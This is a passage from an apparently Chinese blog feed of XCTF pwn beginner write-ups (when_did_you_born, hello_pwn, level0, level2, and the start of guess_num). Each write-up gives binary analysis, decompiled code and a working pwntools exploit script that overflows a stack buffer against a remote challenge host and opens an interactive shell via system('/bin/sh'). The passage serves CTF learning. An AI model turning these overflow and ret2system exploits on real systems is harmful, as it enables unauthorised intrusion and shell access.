class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python3</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,arch=<span class="string">"i386"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">35029</span>)</span><br><span class="line">retn_esp = <span class="number">0xffffd8bc</span></span><br><span class="line">ebp = <span class="number">0xffffd8a8</span></span><br><span class="line">v13 = ebp - <span class="number">0x70</span></span><br><span class="line">offset = retn_esp - ebp + <span class="number">0x70</span></span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset,<span class="string">"("</span>,hex(offset),<span class="string">")"</span>)</span><br><span class="line">system_addr = [<span class="number">0x50</span>,<span class="number">0x84</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">sh = [<span class="number">0x87</span>,<span class="number">0x89</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">()</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"How many numbers you have:\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Give me your numbers\n"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Change_addr</span><span class="params">(offset,addr_part)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"5. exit\n"</span>,<span class="string">"3"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"which number to change:\n"</span>,str(offset))</span><br><span class="line">r.sendlineafter(<span class="string">"new number:\n"</span>,str(addr_part))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment"># 开始</span></span><br><span class="line">start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向返回地址写入system地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+i,system_addr[i])</span><br><span class="line">print(<span class="string">"[*] offset is"</span>,offset)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向system的参数位置写入sh地址</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">Change_addr(offset+j+<span class="number">8</span>,sh[j])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结束</span></span><br><span class="line">r.recvuntil(<span class="string">"5. exit\n"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x04-referencefont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-referencefont"></a> <font color="navy"><code>0x04 Reference</code></font></h3><p>[1] <a href="https://www.zhihu.com/question/23440081" target="_blank" rel="noopener">为什么C语言中数组下标越界不报错？</a></p><p>[2]  <a href="https://www.52tourism.com/C/42666.html?btwaf=35062607" target="_blank" rel="noopener">计算机为什么用二进制和十六进制</a></p><p>[3] <a href="https://senitco.github.io/2017/06/07/string-processing/" target="_blank" rel="noopener">C/C++处理十六进制数和字符串</a></p><p>[4] <a href="http://liul14n.top/2019/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Pwn%E8%BF%9B%E9%98%B6%E5%8C%BA(1)/" target="_blank" rel="noopener">攻防世界-Pwn进阶区(1)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00相关知识点font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00相关知识点font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00.相
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【XCTF-pwn】新手区writeup（part1）</title>
    <link href="https://muzibing.github.io/2020/06/01/2020.06.01%EF%BC%88122%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/06/01/2020.06.01（122）/</id>
    <published>2020-05-31T16:00:00.000Z</published>
    <updated>2020-06-03T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-navy0x00-when_did_you_bornfont"><a class="markdownIt-Anchor" href="#font-color-navy0x00-when_did_you_bornfont"></a> <font color="navy"><code>0x00 when_did_you_born</code></font></h3><h4 id="1相关知识点"><a class="markdownIt-Anchor" href="#1相关知识点"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下的栈溢出原理</li></ol></blockquote><h4 id="2解题思路"><a class="markdownIt-Anchor" href="#2解题思路"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个64位的ELF可执行文件，也就是说在以后的分析中要注意这个条件C</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=718185b5ec9c26eb9aeccfa0ab53678e34fee00a, stripped</span><br><span class="line">root@kali:~/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn# checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/when_did_you)_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化,，开启了cookie，开启了栈不可执行保护</p></blockquote><p><img src="/images/122-2.jpg" alt></p><blockquote><p>从图中可以看出，要想成功的打印出flag，就需要满足<code>v6 == 1926</code>，但是前面有一个条件要满足<code>v6!=1926</code>，所以说程序要正常执行的话，肯定是不能打印出flag的，就需要我们想办法绕过第一个条件<code>v6!=1926</code>，我们看到后面还要我们输入一个<code>v5</code>的值，且v5位于<code>ebp-0x20</code>，而又因为<code>v6</code>位于<code>ebp-0x18</code>，这两个内存空间紧紧的连着，所以虽然开启了canary，但是我们这里也可以利用第二个输入点，实现栈溢出来绕过第一个条件，满足<code>v6 == 1926</code></p></blockquote><h4 id="3解题步骤"><a class="markdownIt-Anchor" href="#3解题步骤"></a> <code>3.解题步骤</code></h4><blockquote><p>因为本题中较简单，看解题思路即可</p></blockquote><h4 id="4exp"><a class="markdownIt-Anchor" href="#4exp"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">57772</span>)<span class="comment"># 包括本题及以下题目的exp中的ip地址和端口号需要更换题目中给出的</span></span><br><span class="line">r.recvuntil(<span class="string">"What's Your Birth?"</span>)</span><br><span class="line">r.sendline(<span class="string">"1111"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"What's Your Name?"</span>)<span class="comment"># 到达溢出点</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">8</span> + str(p64(<span class="number">1926</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x01-hello_pwnfont"><a class="markdownIt-Anchor" href="#font-color-navy0x01-hello_pwnfont"></a> <font color="navy"><code>0x01 hello_pwn</code></font></h3><h4 id="1相关知识点-2"><a class="markdownIt-Anchor" href="#1相关知识点-2"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>地址偏移</li></ol></blockquote><h4 id="2解题思路-2"><a class="markdownIt-Anchor" href="#2解题思路-2"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=05ef7ecf06e02e7f199b11c4647880e8379e6ce0, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/hello_pwn/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>就开启了一个栈不可执行</p></blockquote><p><img src="/images/122-3.png" alt></p><blockquote><p>从上图中可以看到一个read函数和一个<code>sub_400686()</code>函数，而<code>sub_400686()</code>函数是打印出flag，所以只要满足<code>dword_60106C == 1853186401</code>即可，那么在这里<code>dword_60106C</code>表示的是什么意思呢？不知道没关系，下面我用gdb进行调试：</p></blockquote><p><img src="/images/122-4.png" alt></p><blockquote><p>从上图中可以看出，如果要想执行<code>sub_400686()</code>函数，要使得<code>eax</code>中所指向的值和<code>0x6e756161</code>相等，而<code>eax</code>中存放的是<code>0x60106c</code>地址，那么到这里我们就应该清楚了<code>dword_60106C</code>和<code>unk_601068</code>分别表示的是<code>0x60106c</code>和<code>0x601068</code>地址中的值，两者相差4个字节，为了验证一下，在运行程序时，输入点的地方输入的是“<code>AAAA1234567890</code>”，分别看一下这两处地址的值为多少，结果如下图：</p></blockquote><p><img src="/images/122-6.png" alt></p><blockquote><p>从上图可以看出<code>0x601068</code>地址的值为<code>AAAA1234567890</code>，而<code>0x601068c</code>地址处的值为<code>1234567890</code>，所以说我们可以利用这个来满足条件语句。</p></blockquote><h4 id="3解题步骤-2"><a class="markdownIt-Anchor" href="#3解题步骤-2"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-2"><a class="markdownIt-Anchor" href="#4exp-2"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! usr/bin/env python</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">"debug"</span>,endian=<span class="string">"little"</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">37261</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"lets get helloworld for bof"</span>)</span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">4</span> + str(p64(<span class="number">0x6E756161</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x02-level0"><a class="markdownIt-Anchor" href="#font-color-navy0x02-level0"></a> <font color="navy"><code>0x02 level0</code></font></h3><h4 id="1相关知识点-3"><a class="markdownIt-Anchor" href="#1相关知识点-3"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>64位下传参顺序：前六个参数是通过<code>rdi、rsi、rdx、rcx、r8、r9</code>进行传参的，后面的就是通过栈进行传参</li></ol></blockquote><h4 id="2解题思路-3"><a class="markdownIt-Anchor" href="#2解题思路-3"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file pwn</span><br><span class="line">pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br></pre></td></tr></table></figure><blockquote><p>该文件是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level0/pwn&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Hello, World\n"</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function();函数</span></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-80h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以从上图中发现，read函数存在着栈溢出的危险漏洞，我们可以从IDA中看到，该文件中有一个callsystem的函数，于是这道题目就相对容易了</p></blockquote><h4 id="3解题步骤-3"><a class="markdownIt-Anchor" href="#3解题步骤-3"></a> <code>3.解题步骤</code></h4><blockquote><p>【见解题思路】</p></blockquote><h4 id="4exp-3"><a class="markdownIt-Anchor" href="#4exp-3"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = 0x400460</span></span><br><span class="line">system_addr_call = elf.symbols[<span class="string">"callsystem"</span>]</span><br><span class="line"><span class="comment">#bin_sh_addr = 0x400684</span></span><br><span class="line">r.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(system_addr_call),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"><span class="comment"># payload = 0x80*"a" + 8*"a" + str(p64(system_addr),encoding="unicode_escape")+ 8*"a" + str(p64(bin_sh_addr),encoding="unicode_escape")</span></span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题"><a class="markdownIt-Anchor" href="#5存在的问题"></a> <code>5.存在的问题</code></h4><blockquote><ol><li>为什么payload不能为<code>payload = 0x80*&quot;a&quot; + 8*&quot;a&quot; + str(p64(system_addr),encoding=&quot;unicode_escape&quot;)+ 8*&quot;a&quot; + str(p64(bin_sh_addr),encoding=&quot;unicode_escape&quot;)</code></li><li>为什么exp还可以为下方所示：</li></ol></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! python</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#! coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">52526</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400663</span></span><br><span class="line">system_addr = <span class="number">0x0000000000400460</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0000000000400684</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x80</span>*<span class="string">"a"</span> + <span class="number">8</span>*<span class="string">"a"</span> + str(p64(pop_rdi),encoding=<span class="string">"unicode_escape"</span>) + str(p64(bin_sh_addr),encoding=<span class="string">"unicode_escape"</span>) + str(p64(system_addr),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x03-level2font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-level2font"></a> <font color="navy"><code>0x03 level2</code></font></h3><h4 id="1相关知识点-4"><a class="markdownIt-Anchor" href="#1相关知识点-4"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>栈溢出的条件：可以输入的大于分配的</li><li>函数调用时栈中的情况</li></ol><p><img src="/images/119-3.jpg" alt></p></blockquote><h4 id="2解题思路-4"><a class="markdownIt-Anchor" href="#2解题思路-4"></a> <code>2.解题思路</code></h4><p><code>分析</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># file pwn </span><br><span class="line"></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>pwn</code>文件是一个32位的ELF可执行文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># checksec pwn</span><br><span class="line"></span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/level2/pwn&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>没有开启地址随机化和cookie，开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main 函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vulnerable_function()函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-88h]@1</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从上面程序的源代码中可以看出，在<code>vulnerable_function()</code>函数中存在着栈溢出漏洞，因为buf被分配了0x88大小的空间，但实际能输入0x100大小，因此会造成溢出</p></blockquote><h4 id="3解题步骤-4"><a class="markdownIt-Anchor" href="#3解题步骤-4"></a> <code>3.解题步骤</code></h4><blockquote><p>对于本题来说，我们已经找到了溢出点，那么我们的解题思路如下：</p><ul><li>找出“system”和”/bin/sh“的地址</li><li>构造出payload</li></ul></blockquote><p><font color="red"><code>找出system和/bin/sh的地址</code></font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># ROPgadget --binary pwn --string &quot;system&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804824b : system</span><br><span class="line"></span><br><span class="line"># ROPgadget --binary pwn --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x0804a024 : /bin/sh</span><br></pre></td></tr></table></figure><blockquote><p>查找”system“函数和“/bin/sh”字符串的地址，可知system的地址为：<code>0x0804824b</code>，/bin/sh的地址为<code>0x0804a024</code></p></blockquote><p><font color="red"><code>构造payload</code></font></p><blockquote><p>根据上述分析，我们可以构造如下payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x88</span> + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(system),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(/bin/sh),encoding=<span class="string">"unicode_escape"</span>)</span><br></pre></td></tr></table></figure><blockquote><ul><li><code>&quot;a&quot;*0x88</code>：这是buf要填充的字节</li><li><code>&quot;a&quot;*4</code>：是填充<code>Old Ebp</code>的字节</li><li><code>str(p32(system),encoding=&quot;unicode_escape&quot;)</code>：是system的地址</li><li><code>&quot;a&quot;*4</code>：作为system函数的返回地址</li><li><code>str(p32(/bin/sh),encoding=&quot;unicode_escape&quot;)</code>：是system参数/bin/sh的地址</li></ul></blockquote><p><img src="/images/122-1.png" alt></p><h4 id="4exp-4"><a class="markdownIt-Anchor" href="#4exp-4"></a> <code>4.EXP</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">35965</span>)</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">"debug"</span>,os=<span class="string">"linux"</span>,endian=<span class="string">"little"</span>,arch=<span class="string">"i386"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"Input:"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span> * <span class="string">"a"</span> + <span class="number">4</span>*<span class="string">"a"</span> + str(p32(<span class="number">0x08048320</span>),encoding=<span class="string">"unicode_escape"</span>) + <span class="string">"a"</span>*<span class="number">4</span> + str(p32(<span class="number">0x0804A024</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="font-color-navy0x04-guess_numfont"><a class="markdownIt-Anchor" href="#font-color-navy0x04-guess_numfont"></a> <font color="navy"><code>0x04 guess_num</code></font></h3><h4 id="1相关知识点-5"><a class="markdownIt-Anchor" href="#1相关知识点-5"></a> <code>1.相关知识点</code></h4><blockquote><ol><li><code>srand()</code>、<code>rand()</code>函数</li><li>python的<a href="https://docs.python.org/zh-cn/3.7/library/ctypes.html" target="_blank" rel="noopener"><code>ctypes</code></a>外部函数库</li></ol></blockquote><h4 id="2解题思路-5"><a class="markdownIt-Anchor" href="#2解题思路-5"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file guess_num </span><br><span class="line">guess_num: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c5689a0b4458c068fb51e3a2c167b112c3ba7323, stripped</span><br></pre></td></tr></table></figure><blockquote><p>该pwn文件也是一个64位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 